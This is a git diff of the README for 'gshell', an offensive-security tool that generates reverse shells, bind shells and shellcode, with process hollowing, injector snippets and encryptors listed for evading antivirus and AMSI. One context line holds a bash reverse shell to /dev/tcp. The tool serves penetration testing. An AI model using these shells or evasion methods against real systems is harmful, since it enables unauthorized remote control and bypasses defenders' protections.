@@ -3,6 +3,8 @@
 [![made-with-python](http://forthebadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
 [![built-with-love](https://forthebadge.com/images/badges/built-with-love.svg)](https://forthebadge.com)
 
+> **WARNING**: This is a development branch expect empty stuff and empty outputs.
+
 A simple yet flexible cross-platform shell generator tool.
 
 > Name: G(Great) Shell
@@ -107,19 +109,19 @@ bash -i >& /dev/tcp/$ip/$port 0>&1
 This is the help menu:
 
 ```powershell
-PS C:\gshell> python gshell.py -h
-usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--linux] [--base64] [--base32] [--base16] [--url]
-                 [--no-block] [-l] [-a] [-h]
+PS C:\gshell> python .\gshell.py -h
+usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--windows] [--linux] [--base64]
+                 [--base32] [--base16] [--url] [--obfuscate] [--xor] [--aes] [--des] [--rc2] [--caesar] [--no-block] [--list] [--advice] [-h]
 
- ██████  ███████ ██   ██ ███████ ██      ██
-██       ██      ██   ██ ██      ██      ██
-██   ███ ███████ ███████ █████   ██      ██
-██    ██      ██ ██   ██ ██      ██      ██
- ██████  ███████ ██   ██ ███████ ███████ ███████
+ ██████  ███████ ██   ██ ███████ ██      ██      
+██       ██      ██   ██ ██      ██      ██      
+██   ███ ███████ ███████ █████   ██      ██      
+██    ██      ██ ██   ██ ██      ██      ██      
+ ██████  ███████ ██   ██ ███████ ███████ ███████ 
 
 Generate shellcodes, bind shells and/or reverse shells with style
 
-            Version: 1.2
+            Version: 1.3 dev
             Author: nozerobit
             Twitter: @nozerobit
 
@@ -139,17 +141,28 @@ Snippets Types:
   --hollowing           Print process hollowing code snippets
   --injector            Print process injector code snippets
 
-Shellcode Required Options:
-  --shellcode           Generate shellcodes, requires --srev or --sbind and --linux
+Shellcode Types:
+  --shellcode           Generate shellcodes, requires --srev or --sbind and --windows or --linux
   --srev                Reverse shell shellcode
   --sbind               Bind shell shellcode
+  --windows             Windows shellcode
   --linux               Linux shellcode
 
 Encoding Options:
-  --base64              Add base64 encoding
-  --base32              Add base32 encoding
-  --base16              Add base16 encoding
-  --url                 Add URL encoding
+  --base64              Add base64 encoding to payload types
+  --base32              Add base32 encoding to payload types
+  --base16              Add base16 encoding to payload types
+  --url                 Add URL encoding to payload types
+
+Obfuscation Options:
+  --obfuscate           Obfuscate payload types
+
+Encryptor Options:
+  --xor                 XOR encrypt shellcode types
+  --aes                 AES encrypt shellcode types
+  --des                 DES encrypt shellcode types
+  --rc2                 RC2 encrypt shellcode types
+  --caesar              Caesar encrypt shellcode types
 
 Markdown Options:
   --no-block            Skip ```
@@ -158,8 +171,8 @@ Markdown Options:
                         ``` while parsing
 
 Help Options:
-  -l, --list            List the available shell types
-  -a, --advice          Print advice and tips to get connections
+  --list                List the available shell types
+  --advice              Print advice and tips to get connections
   -h, --help            Show this help message and exit
 ```
 
@@ -387,13 +400,24 @@ If you find any issues then you can open an issue or contact me on [twitter](htt
 
 If you want to contribute then please feel free.
 
-Any feedback is appreciated.
+Any suggestions, feedback, pull requests and comments are welcome!
+
+# Disclaimer
+
+Any harm brought by this tool is not the responsibility of any contributors or the author.
+
+# Credits
+
+This project was heavily inspired by these other projects so I would like to give them credits:
+
+- [markdown-code-runner (fork)](https://github.com/iesahin/markdown-code-runner)
+- [OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)
 
 # ToDo
 
 The version 2.0 should have the following:
 
-1. Encryptors: To bypass AVs
-2. Obfuscators: To bypass AVs
-3. Anti-AMSI: To bypass AMSI
-4. Add Windows Shellcode
+[ ] Encryptors: To bypass AVs
+[ ] Obfuscators: To bypass AVs
+[ ] Anti-AMSI: To bypass AMSI
+[ ] Add Windows Shellcode
